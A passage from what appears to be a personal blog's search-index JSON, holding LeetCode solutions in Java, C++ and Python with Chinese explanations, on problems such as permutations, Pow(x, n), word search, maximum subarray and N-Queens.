false);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"415. Add Strings","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-415-Add-Strings/","text":"Given two non-negative integers num1 and num2 represented as string, return the sum of num1 and num2. Note: The length of both num1 and num2 is &lt; 5100. Both num1 and num2 contains only digits 0-9. Both num1 and num2 does not contain any leading zero. You must not use any built-in BigInteger library or convert the inputs to integer directly. Java考查数字和字符串的基本操作。 1234567891011121314151617181920public String addStrings(String num1, String num2) &#123; if (num1 == null || num2 == null) return \"\"; int n1 = num1.length(), n2 = num2.length(); int i = 0, carry = 0; int d1, d2, digit; StringBuilder s = new StringBuilder(); while (i &lt; n1 || i &lt; n2 || carry &gt; 0) &#123; d1 = 0; d2 = 0; if (i &lt; n1) d1 = num1.charAt(n1 - 1 - i) - '0'; if (i &lt; n2) d2 = num2.charAt(n2 - 1 - i) - '0'; digit = d1 + d2 + carry; if (digit &gt; 9) &#123;carry = 1; digit -= 10;&#125; else carry = 0; s.append(digit); i++; &#125; return s.reverse().toString();&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"42. Trapping Rain Water","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-42-Trapping-Rain-Water/","text":"Given $n$ non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining. For example,Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6. The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"greedy algorithm","slug":"greedy-algorithm","permalink":"http://larryim.cc/tags/greedy-algorithm/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"429. N-ary Tree Level Order Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-429-N-ary-Tree-Level-Order-Traversal/","text":"Given an n-ary tree, return the level order traversal of its nodes’ values. (ie, from left to right, level by level). For example, given a 3-ary tree: We should return its level order traversal: 12345[ [1], [3,2,4], [5,6]] Note: The depth of the tree is at most 1000. The total number of nodes is at most 5000. Java这道题目是102. Binary Tree Level Order Traversal的扩展，将一棵树的子节点的数目从2增加到了任意。其实只要在遍历的时候，依次遍历子节点就行了。 123456789101112131415161718public List&lt;List&lt;Integer&gt;&gt; levelOrder(Node root) &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;(); if (root == null) return res; Queue&lt;Node&gt; queue = new LinkedList&lt;&gt;(); queue.offer(root); while (!queue.isEmpty()) &#123; int size = queue.size(); List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; size; i++) &#123; Node node = queue.poll(); list.add(node.val); for (Node child: node.children) if (child != null) queue.offer(child); &#125; res.add(list); &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"82. Remove Duplicates from Sorted List II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-82-Remove-Duplicates-from-Sorted-List-II/","text":"Given a sorted linked list, delete all nodes that have duplicate numbers, leaving only distinct numbers from the original list. Example 1: 12Input: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5Output: 1-&gt;2-&gt;5 Example 2: 12Input: 1-&gt;1-&gt;1-&gt;2-&gt;3Output: 2-&gt;3 1234567891011121314151617181920212223242526272829303132333435363738/** * Given a sorted linked list, delete all nodes that have duplicate numbers, * leaving only distinct numbers from the original list. * * https://leetcode.com/problems/remove-duplicates-from-sorted-list-ii/description/ * * 与 Q83RemoveDuplicatesFromSortedList 非常类似，需要注意的有两点： * 1. 头部元素重复时，需要直接删除头部元素，所以引入了dummy listnode，这样可以不考虑这种特殊情况 * 2. 其他元素重复时，需要遍历直到所有元素都删除干净，小心指针的处理 * */public class Q82RemoveDuplicatesFromSortedListII &#123; public static ListNode deleteDuplicates(ListNode head) &#123; if (head == null || head.next == null) &#123; return head; &#125; ListNode dummy = new ListNode(0); dummy.next = head; ListNode pos = head, prev = dummy; while ((pos != null) &amp;&amp; (pos.next != null)) &#123; if (pos.val == pos.next.val) &#123; while ((pos.next != null) &amp;&amp; (pos.val == pos.next.val)) &#123; pos = pos.next; &#125; pos = pos.next; prev.next = pos; &#125; else &#123; prev = pos; pos = pos.next; &#125; &#125; return dummy.next; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"83. Remove Duplicates from Sorted List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-83-Remove-Duplicates-from-Sorted-List/","text":"Given a sorted linked list, delete all duplicates such that each element appear only once. Example 1: 123456Input: 1-&gt;1-&gt;2Output: 1-&gt;2Example 2:Input: 1-&gt;1-&gt;2-&gt;3-&gt;3Output: 1-&gt;2-&gt;3 12345678910111213141516171819202122232425262728293031323334/** * Given a sorted linked list, delete all duplicates such that each element appear only once. * https://leetcode.com/problems/remove-duplicates-from-sorted-list/description/ * * 由于链表是排序过的，那么直接比较相邻元素就可以发现重复的元素了，然后删除后面的重复元素。 * NOTE: the Linked list is SORTED! Just compare adjacnet node to find repeat values. */public class Q83RemoveDuplicatesFromSortedList &#123; public ListNode deleteDuplicates(ListNode head) &#123; if ((head == null) || (head.next==null)) &#123; return head; &#125; ListNode pos = head; while (pos.next != null) &#123; // comparing adjacnet listnodes if (pos.next.val == pos.val) &#123; pos.next = pos.next.next; &#125; else &#123; pos = pos.next; &#125; &#125; return head; &#125; public static void main(String[] args) &#123; int[] a = new int[]&#123;1,1,1&#125;; //int[] a = new int[]&#123;1,1,2,3,3&#125;; LinkedList list = new LinkedList(a); list.print(); Q83RemoveDuplicatesFromSortedList q83 = new Q83RemoveDuplicatesFromSortedList(); q83.deleteDuplicates(list.head); list.print(); &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"437. Path Sum III","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-437-Path-Sum-III/","text":"You are given a binary tree in which each node contains an integer value. Find the number of paths that sum to a given value. The path does not need to start or end at the root or a leaf, but it must go downwards (traveling only from parent nodes to child nodes). The tree has no more than 1,000 nodes and the values are in the range -1,000,000 to 1,000,000. Example: 123456789101112131415root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8 10 / \\ 5 -3 / \\ \\ 3 2 11 / \\ \\3 -2 1Return 3. The paths that sum to 8 are:1. 5 -&gt; 32. 5 -&gt; 2 -&gt; 13. -3 -&gt; 11 Java深度优先搜索 12345678910public int pathSum(TreeNode root, int sum) &#123; if (root == null) return 0; return pathSumFrom(root, sum) + pathSum(root.left, sum) + pathSum(root.right, sum);&#125; private int pathSumFrom(TreeNode node, int sum) &#123; if (node == null) return 0; return (node.val == sum ? 1 : 0) + pathSumFrom(node.left, sum - node.val) + pathSumFrom(node.right, sum - node.val);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"46. Permutations","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-46-Permutations/","text":"题目Given a collection of distinct integers, return all possible permutations. Example: 12345678910Input: [1,2,3]Output:[ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]] 分析典型的backtracking题目，非常简单。 123456789101112131415161718192021222324252627282930class Solution &#123;public: void permuteHelper(vector&lt;vector&lt;int&gt;&gt; &amp;result, vector&lt;int&gt;&amp; nums, vector&lt;int&gt;&amp; chosen)&#123; if (nums.size()==0)&#123; result.push_back(chosen); &#125;else&#123; for (vector&lt;int&gt;::iterator iter=nums.begin(); iter!=nums.end(); iter++)&#123; //choose int s = *iter; chosen.push_back(s); nums.erase(iter); //explore permuteHelper(result, nums, chosen); //unchoose chosen.pop_back(); nums.insert(iter, s); &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; permute(vector&lt;int&gt;&amp; nums) &#123; vector&lt;int&gt; chosen; vector&lt;vector&lt;int&gt;&gt; result; permuteHelper(result, nums, chosen); return result; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"84. Largest Rectangle in Histogram","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-84-Largest-Rectangle-in-Histogram/","text":"Given $n$ non-negative integers representing the histogram’s bar height where the width of each bar is 1, find the area of largest rectangle in the histogram. Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3]. The largest rectangle is shown in the shaded area, which has area = 10 unit. Example: 12Input: [2,1,5,6,2,3]Output: 10 Java这道题目其实挺难的，一看到题目的时候根本不知道用什么好的解决方法。这里巧妙的利用的stack。stack里存放的是依次递增的数组。当数组依次递增的时候，当前的数字肯定不是右边界，所以不需要求最大面积，只需要依次入栈(stack.push(i))。当遇到递减的元素的时候(heights[stack.peek()] &gt;= cur)，需要停下来求一下面积。首先找到右边界，既然这个数字是减小了的，那么右边界肯定不是它，而是前面的那个数字(i-1)。那么左边界呢？我们构造一个循环，依次弹出栈顶元素，如果它比当当前值要小，那肯定不是；否则依次求其面积(h * w)。 12345678910111213141516171819202122/** * find the area of largest rectangle in the histogram * @param heights: an array of non-negative integers * @return: the area of largest rectangle in the histogram */public static int largestRectangleArea(int[] heights) &#123; if (heights == null || heights.length == 0) &#123; return 0; &#125; Stack&lt;Integer&gt; stack = new Stack&lt;Integer&gt;(); int ans = 0; for (int i = 0; i &lt;= heights.length; i++) &#123; int cur = (i == heights.length) ? -1 : heights[i]; while (!stack.isEmpty() &amp;&amp; heights[stack.peek()] &gt;= cur) &#123; int h = heights[stack.pop()]; int w = stack.isEmpty() ? i : i - stack.peek() - 1; ans = Math.max(ans, h * w); &#125; stack.push(i); &#125; return ans;&#125; reference: https://www.geeksforgeeks.org/largest-rectangle-under-histogram/","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"785. Is Graph Bipartite?","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-785-Is-Graph-Bipartite/","text":"Given an undirected graph, return true if and only if it is bipartite. Recall that a graph is bipartite if we can split it’s set of nodes into two independent subsets A and B such that every edge in the graph has one node in A and another node in B. The graph is given in the following form: graph[i] is a list of indexes $j$ for which the edge between nodes $i$ and $j$ exists. Each node is an integer between 0 and graph.length - 1. There are no self edges or parallel edges: graph[i] does not contain $i$, and it doesn’t contain any element twice. Example 1:123456789Input: [[1,3], [0,2], [1,3], [0,2]]Output: trueExplanation: The graph looks like this:0----1| || |3----2We can divide the vertices into two groups: &#123;0, 2&#125; and &#123;1, 3&#125;. Example 2: 123456789Input: [[1,2,3], [0,2], [0,1,3], [0,2]]Output: falseExplanation: The graph looks like this:0----1| \\ || \\ |3----2We cannot find a way to divide the set of nodes into two independent subsets. Note: graph will have length in range [1, 100]. graph[i] will contain integers in range [0, graph.length - 1]. graph[i] will not contain $i$ or duplicate values. The graph is undirected: if any element $j$ is in graph[i], then $i$ will be in graph[j]. Java判断二分图。详细分析和解答在Algorithms 4th这本书中。 1234567891011121314151617181920212223private boolean bipartitable; public boolean isBipartite(int[][] graph) &#123; bipartitable = true; boolean[] marked = new boolean[graph.length]; boolean[] color = new boolean[graph.length]; for (int v = 0; v &lt; graph.length; v++) if (bipartitable &amp;&amp; !marked[v]) dfs(graph, color, marked, v); return bipartitable; &#125; private void dfs(int[][] graph, boolean[] color, boolean[] marked, int v) &#123; marked[v] = true; for (int w : graph[v])&#123; if (!bipartitable) return; else if (!marked[w]) &#123; color[w] = !color[v]; dfs(graph, color, marked, w); &#125; else if (color[w] == color[v]) bipartitable = false; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"47. Permutations II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-47-Permutations-II/","text":"题目Given a collection of numbers that might contain duplicates, return all possible unique permutations. Example: 1234567Input: [1,1,2]Output:[ [1,1,2], [1,2,1], [2,1,1]] 思路这道题目和46. Permutations基本相同，唯一有区别的地方是排列的数字可能会重复。把结果放在set中，就可以除去重复的结果了。 12345678910111213141516171819202122232425262728293031class Solution &#123;public: void permuteUniqueHelper(set&lt;vector&lt;int&gt;&gt; &amp;result, vector&lt;int&gt;&amp; nums, vector&lt;int&gt;&amp; chosen)&#123; if (nums.size()==0)&#123; result.insert(chosen); &#125;else&#123; for (vector&lt;int&gt;::iterator iter=nums.begin(); iter!=nums.end(); iter++)&#123; //choose int s = *iter; chosen.push_back(s); nums.erase(iter); //explore permuteUniqueHelper(result, nums, chosen); //unchoose chosen.pop_back(); nums.insert(iter, s); &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; permuteUnique(vector&lt;int&gt;&amp; nums) &#123; vector&lt;int&gt; chosen; set&lt;vector&lt;int&gt;&gt; result; permuteUniqueHelper(result, nums, chosen); vector&lt;vector&lt;int&gt;&gt; finals(result.begin(), result.end()); return finals; &#125;&#125;; 另一种方法是先把数组排序，遍历时直接无视重复的数字。 1234567891011121314151617181920212223242526272829303132333435class Solution &#123;public: void permuteUniqueHelper(vector&lt;vector&lt;int&gt;&gt; &amp;res, vector&lt;int&gt;&amp; nums, vector&lt;int&gt;&amp; chosen)&#123; if (nums.size()==0)&#123; res.push_back(chosen); &#125;else&#123; for (vector&lt;int&gt;::iterator iter=nums.begin(); iter!=nums.end(); iter++)&#123; if ((iter!=nums.begin()) &amp;&amp;((*iter)==*(iter-1)))&#123; //遇到重复时，直接跳过 &#125; else&#123; //choose int s = *iter; chosen.push_back(s); nums.erase(iter); //explore permuteUniqueHelper(res, nums, chosen); //unchoose chosen.pop_back(); nums.insert(iter, s); &#125; &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; permuteUnique(vector&lt;int&gt;&amp; nums) &#123; vector&lt;int&gt; chosen; vector&lt;vector&lt;int&gt;&gt; res; sort(nums.begin(), nums.end()); // 1. 排序 permuteUniqueHelper(res, nums, chosen); return res; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"783. Minimum Distance Between BST Nodes","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-783-Minimum-Distance-Between-BST-Nodes/","text":"Given a Binary Search Tree (BST) with the root node root, return the minimum difference between the values of any two different nodes in the tree. Example : 1234567891011121314Input: root = [4,2,6,1,3,null,null]Output: 1Explanation:Note that root is a TreeNode object, not an array.The given tree [4,2,6,1,3,null,null] is represented by the following diagram: 4 / \\ 2 6 / \\ 1 3 while the minimum difference in this tree is 1, it occurs between node 1 and node 2, also between node 3 and node 2. Note: The size of the BST will be between 2 and 100. The BST is always valid, each node’s value is an integer, and each node’s value is different. Java这道题目其实考察的是二叉树的中序遍历，二叉树的中序遍历是一个递增序列，好像是错的。。。。。但是通过了AC。 待续。。。。 1234567891011121314151617181920public int minDiffInBST(TreeNode root) &#123; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode cur = root; int prev = 0, min = Integer.MAX_VALUE, count = 0; while (cur != null || !stack.isEmpty()) &#123; while (cur != null) &#123; stack.push(cur); cur = cur.left; &#125; cur = stack.pop(); if (count != 0) &#123; int diff = cur.val - prev; if (diff &lt; min) min = diff; &#125; count++; prev = cur.val; cur = cur.right; &#125; return min;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Binary Search Tree","slug":"Binary-Search-Tree","permalink":"http://larryim.cc/tags/Binary-Search-Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"12. Integer to Roman","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-12-Integer-to-Roman/","text":"Given an integer, convert it to a roman numeral. Input is guaranteed to be within the range from 1 to 3999. 1234567891011121314class Solution: def intToRoman(self, num): \"\"\" :type num: int :rtype: str \"\"\" values = [ 1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1 ] numerals = [ \"M\", \"CM\", \"D\", \"CD\", \"C\", \"XC\", \"L\", \"XL\", \"X\", \"IX\", \"V\", \"IV\", \"I\" ] ret = '' for i in range(0, len(values)): while num &gt;= values[i]: num -= values[i] ret += numerals[i] return ret 分析罗马数字的计数方法: 12罗马字符 I V X L C D M整数数字 1 5 10 50 100 500 1000 计数规则： 相同的数字连写，所表示的数等于这些数字相加得到的数，例如：III = 3 小的数字在大的数字右边，所表示的数等于这些数字相加得到的数，例如：VIII = 8 小的数字，限于（I、X和C）在大的数字左边，所表示的数等于大数减去小数所得的数，例如：IV = 4 正常使用时，连续的数字重复不得超过三次 在一个数的上面画横线，表示这个数扩大1000倍（本题只考虑3999以内的数，所以用不到这条规则） 罗马数字可以分为1、4、5、9这四种构成方式，而1-3999中，共有1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1，共计13种，依次分别对应”M”, “CM”, “D”, “CD”, “C”, “XC”, “L”, “XL”, “X”, “IX”, “V”, “IV”, “I”，即： 12整数数字 1000 900 500 400 100 90 50 40 10 9 5 4 1罗马数字 M CM D CD C XC L XL X IX V IV I","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"50. Pow(x, n)","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-50-Pow-x-n/","text":"题目Implement $\\text{pow}(x, n)$, which calculates $x$ raised to the power $n$($x^n$). Example 1: 12Input: 2.00000, 10Output: 1024.00000 Example 2: 12Input: 2.10000, 3Output: 9.26100 Example 3: 123Input: 2.00000, -2Output: 0.25000Explanation: 2-2 = 1/22 = 1/4 = 0.25 Note: $-100.0 &lt; x &lt; 100.0$ $n$ is a 32-bit signed integer, within the range [−$2^{31}$, $2^{31}$ − 1] 分析最直接的方式当然是$O(n)$的算法，将$x$乘以或者除以$n$次， 1234567double myPow(double x, int n) &#123; if (x == 0) return x; x = x &gt; 0 ? x : 1.0/x; double res = x; for (int i = 1; i &lt; n; i++) res *= x; return res;&#125; 可惜的这种方法超时了，稍微想一想就知道当$n$很大的时候，这种解法肯定是不行的。 另一种方法是使用分治算法，在这里，分治算法的递归公式为 $$x^n = x^{(n/2)} \\times x^{(n/2)} \\times x^{(n\\%2)}$$ 最差运行时间$T(n)$用递归表达式表达为 $$T(n) = T(n/2)\\times T(n/2) \\times T(n\\%2) $$ 因为$n/2$和$n%2$的最终结果只有0，-1，1三种，所以只考虑这三种base case. 1234567public double myPow(double x, int n) &#123; if (n == 0) return 1; if (n == 1) return x; if (n == -1) return 1.0 / x; double y = myPow(x, n / 2); return y * y * myPow(x, n % 2);&#125; 下面用位操作来计算。考虑$n$的二进制表示. 例如, 如果$n$是 “10001011”, 则 $x^n = x^{1+2+8+128} = x^{1} \\times x^{2} \\times x^{8} \\times x^{128}$. 因此, 我们不用循环$n$次来计算$x^n$. 为了加快计算, 我们遍历$n$中的每一位, 如果第$i$位是1, 我们把结果乘以$x^{2^i} = x^{(1 &lt;&lt; i)}$. 既然 $(1 &lt;&lt; i)$是2的指数, $x^{(1&lt;&lt;(i+1))}$ = square($x^{(1&lt;&lt;i)}$). 这个循环最多执行$\\log(n)$次, i.e.$n$的二进制表示中最多有$\\log(n)-1$位1). 12345678910111213141516171819202122232425public double myPow(double x, int n) &#123; if (n == 0) return 1; if (n == 1) return x; if (n &lt; 0) &#123; // 不能直接 n = -n, 当n = -2147483648 if (n == Integer.MIN_VALUE) &#123; return 1 / myPow(x, Integer.MAX_VALUE) / x; &#125; else &#123; x = 1.0/x; n = -n; //防止溢出 &#125; &#125; double res = 1; while (n &gt; 0) &#123; // n的第i位是1 if ((n &amp; 1) &gt; 0) // res *= x^(1 &lt;&lt; i) res *= x; // n 右移一位 n &gt;&gt;= 1; x = x*x; &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"79. Word Search","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-79-Word-Search/","text":"题目Given a 2D board and a word, find if the word exists in the grid. The word can be constructed from letters of sequentially adjacent cell, where “adjacent” cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once. Example: 12345678910board =[ [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;E&apos;], [&apos;S&apos;,&apos;F&apos;,&apos;C&apos;,&apos;S&apos;], [&apos;A&apos;,&apos;D&apos;,&apos;E&apos;,&apos;E&apos;]]Given word = &quot;ABCCED&quot;, return true.Given word = &quot;SEE&quot;, return true.Given word = &quot;ABCB&quot;, return false. 分析这道题目和迷宫非常相似。Word类似于迷宫的出路。Board类似于迷宫。区别就是没有了迷宫的出发点和出路的数目是固定的。所以一开始就构造一系列出发点，变动word使其达到base case。还有一个区别就是路不能重复走，所以走动以后可以改为’.’，使其不匹配。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123;public: bool exist_helper(vector&lt;vector&lt;char&gt;&gt;&amp; board, int&amp; nrow, int&amp; ncolumn, string&amp; word, int row, int column)&#123; if (!word.size())&#123; //base case return true; &#125; if(row&lt;0||column&lt;0||column&gt;ncolumn-1||row&gt;nrow-1)&#123; // 出了边界，无效 return false; &#125; else if (board[row][column]==word[0])&#123; //choose and explore word.erase(word.begin()); char s = board[row][column]; board[row][column]= '.'; bool result = exist_helper(board, nrow, ncolumn, word, row+1, column) || exist_helper(board, nrow, ncolumn, word, row-1, column) || exist_helper(board, nrow, ncolumn, word, row, column+1) || exist_helper(board, nrow, ncolumn, word, row, column-1); //unchoose if (!result)&#123; word.insert(word.begin(), s); board[row][column] = s; &#125; return result; &#125; else&#123; return false; &#125; &#125; bool exist(vector&lt;vector&lt;char&gt;&gt;&amp; board, string word) &#123; int nrow = board.size(); int ncolumn = board[0].size(); bool res = false; //构造迷宫出发点 for (int i=0; i&lt;nrow; i++)&#123; for (int j=0; j&lt;ncolumn; j++)&#123; res = res | exist_helper(board, nrow, ncolumn, word, i, j); &#125; &#125; return res; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"507. Perfect Number","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-507-Perfect-Number/","text":"We define the Perfect Number is a positive integer that is equal to the sum of all its positive divisors except itself. Now, given an integer $n$, write a function that returns true when it is a perfect number and false when it is not. Example: 123Input: 28Output: TrueExplanation: 28 = 1 + 2 + 4 + 7 + 14 Note: The input number $n$ will not exceed 100,000,000. (1e8) Java完全数的所有的真因子(即除了自身以外的约数)的和，恰好等于它本身。时间复杂度$O(\\log n)$。 12345678910public boolean checkPerfectNumber(int num) &#123; if (num &lt; 2) return false; // 1 肯定是因子 int sum = 1; for (int i = 2; i * i &lt; num; i++) &#123; // i从2开始 if (num % i == 0) sum += i + num/i; &#125; return sum == num; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"53. Maximum Subarray","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-53-Maximum-Subarray/","text":"Given an integer array nums, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum. Example: 123Input: [-2,1,-3,4,-1,2,1,-5,4],Output: 6Explanation: [4,-1,2,1] has the largest sum = 6. Follow up: If you have figured out the $O(n)$ solution, try coding another solution using the divide and conquer approach, which is more subtle. Java这个问题要求连续子数组的最大和。解决的算法叫做Kadane’s algorithm. 下面的话摘自Jon Bentley在ACM Communication的文章(被整理成一本书叫编程珠玑，该问题在编程珠玑第8章)。 algorithm that operates on arrays: it starts at the left end (element nums[1]) and scans through to the right end (element nums[$n$]), keeping track of the maximum sum subvector seen so far. The maximum is initially nums[0]. Suppose we’ve solved the problem for nums[$1 .. i - 1$]; how can we extend that to nums[1 .. $i$]? The maximum sum in the first $i$ elements is either the maximum sum in the first $i - 1$ elements (which we’ll call maxSoFar), or it is that of a subvector that ends in position $i$ (which we’ll call maxEndingHere). 12345678public int maxSubArray(int[] nums) &#123; int maxSoFar = nums[0], maxEndingHere = nums[0]; for (int i=1; i &lt; nums.length; ++i)&#123; maxEndingHere = Math.max(maxEndingHere + nums[i], nums[i]); maxSoFar = Math.max(maxSoFar, maxEndingHere); &#125; return maxSoFar;&#125; 其中 1maxEndingHere = Math.max(maxEndingHere + nums[i], nums[i]); 也可以替换成123// only when the maxEndingHere is negative, we start to calculate the sum again.if (maxEndingHere &lt; 0) maxEndingHere = nums[i];else maxEndingHere += nums[i]; 它们的含义和功能都是一样的。","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Classic","slug":"Classic","permalink":"http://larryim.cc/tags/Classic/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Divide and Conquer","slug":"Divide-and-Conquer","permalink":"http://larryim.cc/tags/Divide-and-Conquer/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"51. N-Queens","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-51-N-Queens/","text":"题目The $n$-queens puzzle is the problem of placing $n$ queens on an $n\\times n$ chessboard such that no two queens attack each other. Given an integer $n$, return all distinct solutions to the $n$-queens puzzle. Each solution contains a distinct board configuration of the n-queens’ placement, where &#39;Q&#39; and &#39;.&#39; both indicate a queen and an empty space respectively. Example: 123456789101112Input: 4Output: [ [&quot;.Q..&quot;, // Solution 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, // Solution 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;]] Explanation: There exist two distinct solutions to the 4-queens puzzle as shown 